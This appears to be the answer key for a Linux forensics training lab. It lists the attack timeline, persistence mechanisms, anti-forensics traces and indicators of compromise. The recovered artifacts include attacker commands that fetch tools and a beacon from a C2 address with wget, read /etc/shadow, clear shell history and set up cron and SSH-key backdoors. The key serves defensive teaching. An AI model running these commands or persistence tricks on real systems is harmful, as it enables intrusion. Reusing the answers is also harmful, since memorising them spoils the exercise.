# ANSWER KEY - Linux Forensics Lab

## Scenario Summary

**Attack Timeline:**
| Time | Event |
|------|-------|
| 2024-01-15 02:34:17 | Initial access via webshell upload |
| 2024-01-15 02:35:42 | Reconnaissance (linpeas) |
| 2024-01-15 02:41:33 | Privilege escalation |
| 2024-01-15 02:43:15 | Malware deployment |
| 2024-01-15 02:45:08 | Persistence mechanisms installed |
| 2024-01-15 02:52:44 | Data exfiltration |
| 2024-01-15 02:55:19 | Anti-forensics/cleanup |

**Attacker Infrastructure:**
- C2 Server: `198.51.100.47`
- Compromised Account: `webadmin`

---

## Challenge 1: Timestamps - Answers

### Task 1.1: Timestomped Files
**File:** `/etc/app.conf`

```bash
$ stat /etc/app.conf
# mtime: 2023-06-15 10:00:00 (FAKED - appears 7 months old)
# ctime: 2024-01-15 02:XX:XX (REAL - can't be faked with touch)
```

The attacker used `touch -d "2023-06-15"` to make the file look old, but ctime reveals the truth.

### Task 1.3: Timeline Order
1. `/var/www/html/.shell.php` - 02:34:17 (initial access)
2. `/tmp/linpeas.sh` - 02:35:42 (recon)
3. `/tmp/.hidden/beacon` - 02:43:15 (malware)
4. `/var/spool/cron/crontabs/webadmin` - 02:45:08 (persistence)
5. `/home/webadmin/.bash_history` - 02:55:19 (cleanup)

---

## Challenge 2: Extended Attributes - Answers

### Task 2.1: Hidden Data in xattrs
**File:** `/opt/webapp/config.dat`

```bash
$ getfattr -d /opt/webapp/config.dat
user.payload="base64encodedmalware"
user.c2_server="198.51.100.47"
```

### Task 2.2: Capability Abuse
**File:** `/usr/local/bin/syshealth`
**Capability:** `cap_setuid+ep`

```bash
$ getcap /usr/local/bin/syshealth
/usr/local/bin/syshealth = cap_setuid+ep
```

This is dangerous because:
- `cap_setuid` allows the binary to call setuid(0) and become root
- This binary should NOT have this capability
- It's a subtle backdoor - harder to detect than SUID

---

## Challenge 3: Inodes - Answers

### Task 3.1: Hard Link Detection
**Same file, two paths:**
- `/tmp/.hidden/beacon`
- `/var/tmp/.cache/systemd-helper`

```bash
$ ls -li /tmp/.hidden/beacon /var/tmp/.cache/systemd-helper
# Same inode number = same file
```

The attacker created a hard link so:
- If one path is discovered and deleted, the file still exists
- Two different names makes detection harder
- One looks malicious, one looks legitimate

---

## Challenge 4: /proc Forensics - Answers

### Task 4.1-4.3: After running `/plant_artifacts.sh`

**Deleted-but-open file (Task 4.2):**
```bash
$ cat /proc/<FD_PID>/fd/3
Exfiltrated credentials:
admin:SuperSecret123
root:RootPassword!
```

**Suspicious environment (Task 4.3):**
```bash
$ cat /proc/<ENV_PID>/environ | tr '\0' '\n'
C2_SERVER=198.51.100.47
BEACON_KEY=s3cr3tk3y
EXFIL_PATH=/tmp/data
```

---

## Challenge 5: Binary Artifacts - Answers

Key files to check:
- `/var/log/wtmp` - successful logins
- `/var/log/btmp` - failed logins

Commands: `last`, `lastb`, `lastlog`

---

## Challenge 6: Shell Artifacts - Answers

### Task 6.1: Bash History Analysis
**File:** `/home/webadmin/.bash_history`

**Key findings:**
1. Downloaded linpeas: `wget http://198.51.100.47/tools/linpeas.sh`
2. SUID enumeration: `find / -perm -4000`
3. Downloaded beacon: `wget http://198.51.100.47/beacon`
4. Tried to clear history: `history -c`

### Task 6.2: Anti-history in `.bash_logout`
```bash
$ cat /home/webadmin/.bash_logout
unset HISTFILE
```

### Task 6.3: Vim Artifacts
**File:** `/home/webadmin/.viminfo`

**Files accessed:**
- `/etc/shadow`
- `/var/www/html/.shell.php`
- `/tmp/.hidden/beacon`

**Commands run from vim:**
- `:!cat /etc/shadow`
- `:w /tmp/shadow_copy.txt`

---

## Challenge 7: Persistence - Answers

### All Persistence Mechanisms Found:

| Type | Location | Details |
|------|----------|---------|
| Cron | `/var/spool/cron/crontabs/webadmin` | `*/5 * * * * /tmp/.hidden/beacon` |
| Cron | `/etc/cron.d/system-health` | Runs `/usr/local/bin/syshealth` every 10 min |
| Systemd (user) | `~/.config/systemd/user/update-helper.service` | Runs beacon on boot |
| Systemd (system) | `/etc/systemd/system/cups-helper.service` | Runs syshealth |
| SSH | `/home/webadmin/.ssh/authorized_keys` | Attacker's SSH keys |
| ld.so.preload | `/etc/ld.so.preload` | Library hijacking (commented) |

### Malicious SSH Keys:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzXXXmalicious... attacker@evil.com
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBadKeyHereXXX root@198.51.100.47
```

---

## Challenge 8: ELF Analysis - Answers

### Task 8.2: Strings in Malware
**File:** `/tmp/.hidden/malware_sim`

```bash
$ strings /tmp/.hidden/malware_sim | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}"
198.51.100.47

$ strings /tmp/.hidden/malware_sim
C2_SERVER
BEACON_INTERVAL
s3cr3tk3y
```

---

## Challenge 9: Privilege Escalation - Answers

### SUID Binary
**File:** `/tmp/.hidden/rootbash`
**Original:** Copy of `/bin/bash` with SUID bit

```bash
$ ls -la /tmp/.hidden/rootbash
-rwsr-xr-x ... rootbash
```

### Capabilities
**File:** `/usr/local/bin/syshealth` with `cap_setuid+ep`

### Exploit Source
**File:** `/home/webadmin/exploits/privesc.c`

---

## Challenge 10: Anti-Forensics - Answers

### Timestomping
**File:** `/etc/app.conf`
- mtime: 2023-06-15 (fake)
- ctime: 2024-01-15 (real)

### History Evasion
- `history -c` in `.bash_history`
- `unset HISTFILE` in `.bash_logout`

### Hidden Files/Dirs
- `/tmp/.hidden/`
- `/dev/shm/.cache/`
- `/var/www/html/.shell.php`

### Hosts Manipulation
```bash
$ cat /etc/hosts
198.51.100.47  updates.microsoft.com
198.51.100.47  windowsupdate.com
```

---

## Full IOC List

### IP Addresses
- `198.51.100.47` (C2 server)
- `10.0.0.50` (lateral movement target - in known_hosts)

### File Hashes (run sha256sum on these)
- `/tmp/.hidden/beacon`
- `/tmp/.hidden/malware_sim`
- `/usr/local/bin/syshealth`
- `/var/www/html/.shell.php`

### Usernames
- `webadmin` (compromised)
- `attacker@evil.com` (SSH key)
- `root@198.51.100.47` (SSH key)

### File Paths
- `/var/www/html/.shell.php`
- `/tmp/.hidden/beacon`
- `/tmp/linpeas.sh`
- `/usr/local/bin/syshealth`
- `/etc/cron.d/system-health`
